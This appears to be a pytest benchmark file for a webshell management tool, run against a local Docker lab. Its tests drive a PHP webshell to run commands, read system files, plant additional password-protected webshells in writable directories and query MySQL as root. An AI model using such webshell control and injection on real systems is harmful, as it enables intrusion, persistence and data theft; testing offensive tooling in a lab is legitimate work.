"""Benchmark tests against the docker-compose stack (``docker/docker-compose.yml``).

These need the live stack and are excluded from the default test run. Bring it
up, then opt in with ``-m benchmark``::

    docker compose -f docker/docker-compose.yml up -d --build
    uv run pytest -m benchmark
    docker compose -f docker/docker-compose.yml down -v

They cover the features that require real services — notably the MySQL client
against the bundled ``db`` — complementing the lightweight ``php -S``
integration tests. If the stack is not reachable on :8080 they skip cleanly.
"""

from __future__ import annotations

import pytest
import requests

from webshell_sniper.config import Config
from webshell_sniper.core.webshell import WebShell
from webshell_sniper.features import database, files, inject, recon

pytestmark = pytest.mark.benchmark

TARGET = "http://127.0.0.1:8080/index.php"


@pytest.fixture(scope="module")
def bench_shell(tmp_path_factory: pytest.TempPathFactory) -> WebShell:
    try:
        requests.get(TARGET, timeout=1)
    except requests.RequestException:
        pytest.skip("benchmark stack not up — run `docker compose ... up -d --build`")
    config = Config(output_dir=tmp_path_factory.mktemp("bench"))
    ws = WebShell(TARGET, "POST", "c", config)
    assert ws.connect()
    return ws


def test_command_execution(bench_shell: WebShell):
    assert bench_shell.run_command("whoami").strip() == "www-data"


def test_read_remote_file(bench_shell: WebShell):
    assert bench_shell.run_command("id").strip().startswith("uid=")
    assert files.read_file(bench_shell, "/etc/hostname").strip()


def test_inject_creates_working_shell(bench_shell: WebShell, tmp_path):
    dirs = recon.find_writable_dirs(bench_shell)
    # password=None exercises the per-directory random password path.
    results = inject.inject_webshell(bench_shell, None, dirs, output_dir=tmp_path)
    assert results
    url, password = results[0]
    resp = requests.post(url, data={password: "echo 'INJECTED_OK';"}, timeout=5)
    assert "INJECTED_OK" in resp.text


def test_mysql_client_and_comma_value(bench_shell: WebShell):
    # The target reaches MySQL over the compose network as host `db`.
    manager = database.MysqlManager(bench_shell, "db", "root", "root")
    assert manager.check_connection()
    assert manager.version().startswith("8.")
    assert "benchmark" in manager.databases()
    assert manager.tables("benchmark") == ["users"]

    rows = manager.query("SELECT username, note FROM benchmark.users ORDER BY id")
    # v1 comma-joined columns, which would have split this value into 3 cells.
    assert rows[0] == ["alice", "value, with, commas"]
    assert rows[1] == ["bob", "plain"]
